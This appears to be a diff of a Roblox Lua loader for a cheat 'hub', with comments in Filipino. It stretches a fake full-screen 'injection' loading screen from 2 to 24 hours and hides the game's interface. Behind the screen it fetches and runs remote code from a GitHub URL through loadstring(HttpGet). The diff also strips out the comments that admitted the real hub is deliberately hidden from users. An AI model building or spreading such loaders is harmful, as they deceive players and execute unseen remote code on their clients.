@@ -5,7 +5,8 @@ local StarterGui = game:GetService("StarterGui")
 -- ==================================================================
 -- CONFIGURATION
 -- ==================================================================
-local MAIN_WAIT_TIME = 2 * 60 * 60 -- 2 Hours (7200 seconds)
+-- Pinalitan ko ng 24 hours! (24 hours * 60 mins * 60 secs)
+local MAIN_WAIT_TIME = 24 * 60 * 60 
 local DISCORD_LINK = "https://discord.gg/T8sksQsjmR"
 local HUB_NAME = "SOLIX HUB"
 
@@ -21,7 +22,7 @@ local randomMessages = {
 }
 
 -- ==================================================================
--- 1. INSTANT FULL SCREEN COVER (Para walang makita agad!)
+-- 1. INSTANT FULL SCREEN COVER
 -- ==================================================================
 pcall(function()
     StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
@@ -30,20 +31,20 @@ end)
 local gui = Instance.new("ScreenGui")
 gui.Name = "SolixRedMobileLoader"
 gui.ResetOnSpawn = false
-gui.IgnoreGuiInset = true -- Sinasakop ang buong screen
-gui.DisplayOrder = 999999999 -- Pinakamataas para mabaon sa ilalim yung totoong Hub
+gui.IgnoreGuiInset = true 
+gui.DisplayOrder = 999999999 
 gui.Parent = player:WaitForChild("PlayerGui")
 
 local mainBg = Instance.new("Frame")
 mainBg.Size = UDim2.new(1, 0, 1, 0)
-mainBg.BackgroundColor3 = Color3.fromRGB(5, 0, 0) -- Pitch black/dark red
+mainBg.BackgroundColor3 = Color3.fromRGB(5, 0, 0) 
 mainBg.BorderSizePixel = 0
 mainBg.Parent = gui
 
 local container = Instance.new("Frame")
 container.AnchorPoint = Vector2.new(0.5, 0.5)
 container.Position = UDim2.new(0.5, 0, 0.5, 0)
-container.Size = UDim2.new(0.9, 0, 0.5, 0) -- Mobile fitted
+container.Size = UDim2.new(0.9, 0, 0.5, 0) 
 container.BackgroundTransparency = 1
 container.Parent = mainBg
 
@@ -100,16 +101,14 @@ discordLabel.TextScaled = true
 discordLabel.Parent = container
 
 -- ==================================================================
--- 2. SABAY NA EXECUTION (Nakatago yung totoong Hub)
+-- 2. SABAY NA EXECUTION NG TOTOONG HUB (Nakatago sa ilalim)
 -- ==================================================================
 task.spawn(function()
-    -- I-e-execute agad ang totoong Hub, pero dahil 999999999 ang DisplayOrder
-    -- ng red loading screen natin, 100% matatabunan ito at hindi nila makikita!
     loadstring(game:HttpGet('https://raw.githubusercontent.com/habibbib01/Solix.Hub.ETFB/refs/heads/main/loader.lua'))()
 end)
 
 -- ==================================================================
--- 3. THE 2-HOUR LOADING ANIMATION
+-- 3. THE LONG LOADING ANIMATION (24 Hours)
 -- ==================================================================
 task.spawn(function()
     local startTime = tick()
@@ -128,18 +127,15 @@ task.spawn(function()
     end
     
     -- ==================================================================
-    -- 4. PAGKATAPOS NG 2 HOURS (Lilitaw na ang totoong Hub)
+    -- 4. PAGKATAPOS (Lilitaw na ang totoong Hub)
     -- ==================================================================
     statusText.Text = "Injection Complete! [100%]"
     mainBarFill.Size = UDim2.new(1, 0, 1, 0)
     task.wait(2)
     
-    -- Ibalik ang normal UI ng Roblox (Chat, Leaderboard)
     pcall(function()
         StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
     end)
     
-    -- Burahin ang red loading screen. Pagkabura nito, saktong nakalantad
-    -- na yung totoong Hub dahil kanina pa ito naghihintay sa background!
     gui:Destroy()
 end)
